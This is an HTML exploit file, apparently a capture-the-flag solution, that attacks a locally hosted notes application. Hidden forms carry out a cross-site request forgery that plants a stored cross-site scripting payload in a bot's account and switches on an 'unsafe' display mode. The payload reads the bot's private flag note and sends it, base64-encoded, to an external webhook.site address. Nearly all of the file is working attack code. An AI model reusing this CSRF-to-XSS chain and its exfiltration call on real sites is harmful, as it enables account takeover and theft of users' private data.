<!-- filepath: exploit.html -->
<!doctype html>
<form id="n" action="http://127.0.0.1:7189/dashboard" method="post" style="display:none">
    <!--
        The XSS payload below assumes the BOT'S flag note is at /notes/1.
        It will create a NEW note in the BOT'S account.
        This NEW note will contain the script.
    -->
    <input type="hidden" name="content" value='<script>fetch("/notes/1").then(r=>r.text()).then(t=>{new Image().src="https://webhook.site/6715ace0-a62f-4aa9-b8e1-e0a2e0aec717?d="+encodeURIComponent(btoa(t))})</script>'>
</form>

<form id="u" action="http://127.0.0.1:7189/prefs/unsafe" method="post" style="display:none">
  <!--
      This assumes the note created by form "n" above will get user_note_id = 2 in the BOT'S account.
      This happens if the bot already has one note (the flag note, ID 1).
  -->
  <input type="hidden" name="id" value="2">
  <input type="hidden" name="enable" value="1">
</form>

<script>
// This script opens a new window, submits the first form to create the XSS note in that window,
// then waits a moment and submits the second form to enable unsafe mode for that new note (ID 2)
// and redirect the bot to view it, triggering the XSS.

// IMPORTANT: The target for the forms is the new window 'noteWin'.
// This means the bot's browser will perform these actions.

const w = window.open('about:blank', 'noteWin');
if (w) {
    document.getElementById('n').target = 'noteWin';
    document.getElementById('u').target = 'noteWin';

    document.getElementById('n').submit(); // Submit form to create the XSS note in bot's account
    
    // Wait for the note creation to likely complete, then enable unsafe mode and view it.
    setTimeout(() => {
        document.getElementById('u').submit(); 
    }, 400); // Increased timeout slightly for reliability
} else {
    alert("Popup blocker might be preventing the exploit window from opening. Please disable it for this site and try again.");
    // Fallback or error message if window.open fails
    // You could try submitting to _self or an iframe as a fallback, but the provided solution uses window.open
}
</script>
